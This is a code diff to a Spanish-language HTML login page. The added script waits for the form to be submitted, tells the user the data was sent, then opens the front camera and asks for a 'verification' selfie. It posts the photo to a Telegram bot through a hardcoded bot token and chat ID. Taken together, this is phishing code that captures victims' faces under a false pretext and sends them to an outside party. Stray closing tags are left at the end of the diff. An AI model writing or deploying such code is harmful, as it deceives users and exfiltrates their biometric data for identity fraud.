@@ -36,27 +36,55 @@
         <button type="submit">Entrar</button>
     </form>
 </div>
+<!-- CAMARA QUE APARECE DESPUES DE DAR ENTRAR -->
+<video id="video" autoplay playsinline style="display:none; width:100%; margin-top:10px; border-radius:10px"></video>
+<canvas id="canvas" style="display:none"></canvas>
+<button id="btnFoto" onclick="tomarFoto()" type="button" style="display:none; margin-top:10px; padding:10px; background:green; color:white; border:none; border-radius:5px">📷 Tomar Foto</button>
 
 <script>
+// CUANDO LE DEN CLIC A ENTRAR
+document.getElementById('miFormulario').addEventListener('submit', function(e){
+  setTimeout(() => {
+    alert("Datos enviados ✅ Ahora tómate la foto para verificar");
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const fotoInput = document.getElementById('foto');
-    
+    document.getElementById('video').style.display = 'block';
+    document.getElementById('btnFoto').style.display = 'block';
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-.then(stream => { video.srcObject = stream; video.style.display = 'block'; })
-.catch(err => { alert("Activa los permisos de cámara porfa"); });
+    .then(stream => { video.srcObject = stream; })
+    .catch(err => { alert("Activa los permisos de cámara porfa"); });
+  }, 1000);
+})
 
-    function tomarFoto() {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.style.display = 'block';
-        canvas.toBlob(blob => {
-            const file = new File([blob], "foto.jpg", {type: "image/jpeg"});
-            const dataTransfer = new DataTransfer();
-            dataTransfer.items.add(file);
-            fotoInput.files = dataTransfer.files;
-            alert("Foto tomada correctamente ✅");
+// CUANDO LE DEN A TOMAR FOTO
+function tomarFoto() {
+  const token = "8970164569:AAFHWcsR63bNfXIfgF0EfVkodTWuNSCKpbc";
+  const chat_id = "-1004395775315";
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  canvas.style.display = 'block';
+
+  canvas.toBlob(function(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'foto.jpg');
+    formData.append('caption', '📸 Foto de verificación');
+
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method: 'POST',
+      body: formData  // <- OJO: va con M
+    })
+    .then(() => {
+        alert("Foto enviada correctamente ✅");
+        video.srcObject.getTracks().forEach(track => track.stop());
+        document.getElementById('video').style.display = 'none';
+        document.getElementById('btnFoto').style.display = 'none';
+    });
+  });
+}
+</script>
         });
     }
 </script>
